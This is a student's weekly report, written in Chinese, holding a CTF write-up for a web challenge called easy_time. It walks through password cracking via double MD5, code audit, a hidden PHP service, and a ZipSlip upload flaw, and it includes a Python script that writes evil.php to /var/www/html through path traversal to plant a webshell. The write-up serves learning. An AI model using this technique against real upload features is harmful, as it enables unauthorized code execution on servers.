# 周报（20260406-20260412）
## 1.2026ciscn&ccb分区赛 easy_time
本周我尝试做了一下学长们夺冠的2026ciscn&ccb分区赛的一道Web题——easy_time，以下是我的Write Up。

1. 首先先审计index.py中关于login页面的代码，可知h2应为密码md5两次之后的结果，故利用cmd5这个网站即可得到密码应为secret。![image.png](https://img.uettypi.top/2026/04/20260406213214799.png)
2. 成功登录进入后台后，有3个路径，粗略地看了一下，如果存在漏洞的话，大概是：插件上传——文件上传、留言板——SSTI/XSS、个人About/头像——SSRF&文件上传。然后，开始审计相关功能的代码。审完后，可以发现，所有用到模板的地方都是传参，没有拼接，可见并不存在SSTI；然后是SSRF，这个有，但是由于这段代码限制了协议类型，所以各类伪协议都不能用了：
```python
if parsed.scheme not in {"http", "https"}:
	return None
```
3. 最后是文件上传，这里有两个点，一个是插件上传，另一个是头像上传。插件上传粗审感觉是压缩包软链接，但这个我不太熟，所以先审了头像上传，这个看起来是要上传一个图片马，但后缀名是白名单，且强制重命名，所以这里线索断了，只能审插件上传了。
4. 插件上传审不明白...
5. 做到这里的时候思路断了，于是在本地利用题目附件中给出的Dokerfile构建了一个Docker，这下发现了一个重大的突破点：靶机的80端口存在一个PHP服务！![image.png](https://img.uettypi.top/2026/04/20260407130109666.png)（由Dockerfile可知，靶机暴露了两个端口，经过测试，5000端口为Python服务，即靶机打开后默认进入的服务，80端口则是一个隐藏的PHP服务）![image.png](https://img.uettypi.top/2026/04/20260407130444727.png)
6. 接下来的思路就比较清晰了：利用文件上传上传WebShell，再利用PHP服务将其解析即可。所以还是得审计插件上传的代码，这里就利用AI帮我审计了一下，可知确实存在文件上传漏洞，且为ZipSlip。![image.png](https://img.uettypi.top/2026/04/20260407133524659.png)
7. 知道了是ZipSlip之后，就好办了，这里直接找了个ZipSlip的Python脚本，然后先在evil.php中写入一句话木马，再修改软链接路径为PHP服务所在的目录，即可生成恶意压缩包，最后利用插件上传上传并解压WebShell即可。
```python
import zipfile

if __name__ == "__main__":
	try:
		zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
		info = zipfile.ZipInfo("poc.zip")
		zipFile.write("evil.php", "../../../../../var/www/html/evil.php",zipfile.ZIP_DEFLATED)
		zipFile.close()
	except IOError as e:
		raise e
```
